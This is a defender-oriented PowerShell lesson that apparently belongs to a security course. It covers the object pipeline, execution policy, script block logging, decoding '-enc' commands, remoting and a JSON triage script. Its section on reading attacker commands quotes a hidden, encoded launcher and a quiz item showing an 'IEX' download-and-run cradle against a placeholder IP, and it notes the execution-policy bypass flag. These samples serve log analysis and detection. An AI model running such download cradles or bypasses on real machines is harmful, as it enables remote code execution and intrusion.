---
title: PowerShell for defenders
summary: Objects and the pipeline, remoting, execution policy, script block logging, and a triage script that outputs JSON.
month: 5
minutes: 65
builds: wintriage.ps1, which collects a host snapshot as JSON
source: PowerShell 101, Microsoft Learn | https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/00-introduction
words: cmdlet, execution policy, script block logging
---
PowerShell is Windows' automation language, and it's on every Windows machine. That's why attackers love it, and why you need to read it as fluently as they write it.

@term PowerShell = Microsoft's command shell and scripting language, which works with objects.
@term cmdlet = A PowerShell command, named Verb-Noun, like Get-Process.
@term execution policy = A PowerShell setting that controls whether scripts run. It's a safety feature, not a security boundary.
@term script block logging = PowerShell logging that records the code it runs, as event 4104.
@term remoting = Running PowerShell commands on another machine.

## Your first ten minutes

Open the Start menu, type `powershell` and press Enter. The window shows a prompt such as `PS C:\Users\ana>`: `PS` says you're in PowerShell, and the rest is your current folder.

Every command, called a **cmdlet**, is named with a verb, a dash and a noun: `Get-Process`, `Stop-Service`, `New-Item`. That one rule means you can often guess a command you've never seen. `Get-` commands only read, so they're safe to explore with. Options are called **parameters**, start with a dash, and are spelt out: `Get-Process -Name notepad`. Press Tab to complete a half-typed command or parameter.

Three commands teach you all the others, so learn these before anything else:

| Command | Answers |
|---|---|
| `Get-Command *service*` | Which commands have "service" in their name? |
| `Get-Help Get-Service -Examples` | How do I use this one? |
| `Get-Service \| Get-Member` | What can I ask of the things it returns? |

You'll meet short names in other people's scripts. They're **aliases**: `ls` and `dir` both mean `Get-ChildItem`, `?` means `Where-Object` and `%` means `ForEach-Object`. `Get-Alias ls` tells you what one stands for. Attackers use aliases to make commands shorter and harder to search for, so learn to expand them in your head.

?? You've never seen `Restart-Service`. What can you tell from its name alone?
+ It restarts a service: verb, then noun
- It reads a log file about services
- It only works on a remote machine
- It needs a script file to run
=> Cmdlets are named Verb-Noun. `Get-Help Restart-Service -Examples` then shows you how to use it.

## Objects, not text

Bash pipes pass **text**, which is why you used `awk` to cut columns. PowerShell pipes pass **objects** with named properties, so you just ask for what you want.

```powershell
Get-Process | Where-Object CPU -gt 100 | Sort-Object CPU -Descending |
    Select-Object -First 5 Name, Id, CPU

Get-Service | Where-Object Status -eq Running
Get-NetTCPConnection -State Established
Get-ScheduledTask | Where-Object State -eq Ready
Get-LocalUser
```

Take the first command apart, one stage at a time. Run each line and watch the output shrink:

```powershell
Get-Process                                           # every process, as objects
Get-Process | Where-Object CPU -gt 100                # keep those whose CPU property is over 100
Get-Process | Where-Object CPU -gt 100 | Sort-Object CPU -Descending     # biggest first
```

`Select-Object -First 5 Name, Id, CPU` then keeps five objects and three of their properties. Nothing was cut out of text at any stage: each stage received whole objects and passed whole objects on.

`Where-Object` has a longer form that you need when a test has more than one part. Inside the braces, `$_` means "the object passing through right now":

```powershell
Get-Process | Where-Object { $_.CPU -gt 100 -and $_.Path -notlike 'C:\Windows\*' }
```

Comparisons are words with a dash, not symbols, because `>` already means "write to a file":

| Operator | Means |
|---|---|
| `-eq`, `-ne` | Equal, not equal |
| `-gt`, `-lt` | Greater than, less than |
| `-like` | Matches a pattern with `*` wildcards |
| `-match` | Matches a regular expression |
| `-and`, `-or`, `-not` | Combine tests |

The end of a pipeline decides the shape of the output: `Format-List *` shows every property of each object, `Export-Csv out.csv` writes a spreadsheet, and `ConvertTo-Json` writes JSON for another tool.

To explore, use the built-in help:

```powershell
Get-Help Get-Process -Examples
Get-Command *event*
Get-Process | Get-Member       # what properties does it have?
```

?? Why don't you need `awk` to pick a column in PowerShell?
+ The pipeline passes objects with named properties
- PowerShell output is always a single column
- PowerShell has no way to process text
- Windows stores its output in the registry
=> You ask for the property by name. That's the main idea behind PowerShell.

## Execution policy isn't a security control

PowerShell has an execution policy that limits running scripts. Microsoft is explicit: ["The execution policy isn't a security boundary, it's defense in depth."](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies) A user can bypass it with `-ExecutionPolicy Bypass`, or by pasting the script's contents.

So don't rely on it. The controls that matter are logging, and [application control](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/appcontrol).

?? Why isn't execution policy a real control?
+ Users can simply bypass it
- It only applies on Linux
- It slows PowerShell too much
- It was removed from Windows
=> Microsoft says so itself. Rely on logging and application control.

## Script block logging

Attackers obfuscate commands, but PowerShell has to decode them before it runs them. **Script block logging** records the decoded code as **event 4104**. Enable it by Group Policy, then look:

```powershell
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104
} -MaxEvents 5
```

This is why PowerShell is so loud on a well-configured host, and why attackers try to run older versions or disable logging.

On a lab VM with no domain, two lines from an administrator PowerShell window switch it on:

```powershell
$key = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $key -Force
Set-ItemProperty -Path $key -Name EnableScriptBlockLogging -Value 1
```

That's also your first look at variables: `$key` holds a text value, and the next two lines reuse it. Now run something harmless in a new window, such as `Get-Date`, and query for 4104 again. The event's message contains the exact code that ran, with the user and the time.

?? Why does event 4104 work against obfuscated scripts?
+ PowerShell must decode before running it
- Attackers can't use Base64 any more
- Windows blocks all encoded commands now
- Event 4104 decrypts all your files
=> Whatever the disguise, the decoded code gets logged.

## Reading an attacker's one-liner

```powershell
powershell -nop -w hidden -enc SQBFAFgAIAAoAE4A...
```

| Part | Meaning |
|---|---|
| `-nop` | No profile |
| `-w hidden` | Hidden window |
| `-enc` | The command is Base64 of UTF-16 text |

Decode it with [CyberChef](https://gchq.github.io/CyberChef/) or in PowerShell:

```powershell
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("SQBFAFgA..."))
```

Practise on a harmless one. This string is a real encoded command:

```
VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAnAA==
```

Decode it with the line above and you get `Write-Output 'hello'`. To see how such a string is made, go the other way:

```powershell
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Get-Date"))
```

The result is `RwBlAHQALQBEAGEAdABlAA==`. Notice the `A` after almost every other letter: that's the null byte of UTF-16 showing through, and it lets you recognise an encoded PowerShell command at a glance in any log. Decoding is something you'll do in Python as often as in PowerShell, so write the decoder once yourself.

@code decode-enc

A decoded command still has to be judged. No single option proves anything, since administrators use `-enc` too, but options that hide the window, skip the profile and encode the command add up. Triage tools score that combination, and a first version takes a dozen lines.

@code ps-flags

?? Why does `-enc` output look different from plain Base64 of ASCII text?
+ It encodes UTF-16, so bytes alternate with nulls
- It uses encryption keyed to the current user
- It's compressed by Windows just before it runs
- It stores the script in a registry value
=> PowerShell's `-EncodedCommand` expects UTF-16LE, which is why decoded strings show gaps if you treat them as ASCII. It's encoding, not encryption.

## Remoting

`Enter-PSSession -ComputerName SRV1` opens a remote shell, and `Invoke-Command` runs on many machines. Admins use it, and so do attackers moving laterally. It uses WinRM, on ports 5985 and 5986.

?? Which ports does WinRM use?
+ 5985 and 5986
- 22 and 23
- 80 and 443
- 3389 and 445
=> 22 is SSH, 80 and 443 are web, and 3389 is RDP.

## Read it before you run it

A defender reads far more PowerShell than they write: in logs, in tickets, in scripts someone found on a server. Practise reading these the way you'd read a sentence.

```powershell
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' } | Select-Object TaskName, TaskPath
```

?? What does that pipeline show you?
+ The tasks that aren't in Microsoft's folders
- The tasks that Microsoft itself has created
- The tasks that ran this last hour
- The tasks that are currently switched off
=> `-notlike '\Microsoft\*'` removes the hundreds of built-in tasks, which leaves the ones somebody added. It's the scheduled-task version of hiding Microsoft entries in Autoruns.

?? In `Where-Object { $_.Status -eq 'Running' }`, what is `$_`?
+ The object currently passing through the pipeline
- The last error that PowerShell has recorded
- The name of the script being run
- The folder that the command started in
=> Each object arrives in turn, and `$_` is the one being tested at that moment.

?? An event 4104 shows `IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')`. What does that line do?
+ It downloads a script, then runs it directly
- It uploads a local file to a server
- It saves a web page to the desktop
- It checks whether a web server is up
=> `DownloadString` fetches text from the URL, and `IEX`, short for `Invoke-Expression`, runs that text as code. Nothing is written to disk, which is why the 4104 record and the network logs are your evidence.

## Your triage script

::: try Build wintriage.ps1
Collect processes with parents and paths, services, scheduled tasks, established connections and recent logons, then output JSON that your Python tools can read:

```powershell
$report = [ordered]@{
    host       = $env:COMPUTERNAME
    time       = (Get-Date).ToUniversalTime().ToString("o")
    processes  = Get-CimInstance Win32_Process |
                 Select-Object ProcessId, ParentProcessId, Name, ExecutablePath, CommandLine
    services   = Get-CimInstance Win32_Service |
                 Select-Object Name, State, StartMode, PathName
    tasks      = Get-ScheduledTask | Select-Object TaskName, TaskPath, State
    network    = Get-NetTCPConnection -State Established |
                 Select-Object LocalPort, RemoteAddress, RemotePort, OwningProcess
}
$report | ConvertTo-Json -Depth 4 | Out-File triage.json -Encoding utf8
```
Add recent logons, then add it to [P03](/projects/P03/). Note that time is in UTC: always the case for incident work.
:::

Before you extend it, read the script as a list of questions. `[ordered]@{ … }` builds a **hashtable**, PowerShell's version of a Python dict, and keeps the keys in the order you wrote them. Each key is one question about the machine, and its value is the pipeline that answers it. `$env:COMPUTERNAME` reads an environment variable. `ConvertTo-Json -Depth 4` turns the whole structure into text, and `-Depth` says how many levels of nesting to keep. Add a key, and you've added a section to the report.

The Month 5 gate is on [the roadmap](/roadmap/5/).

?! Why does the course say execution policy isn't a security control? What would you rely on instead?
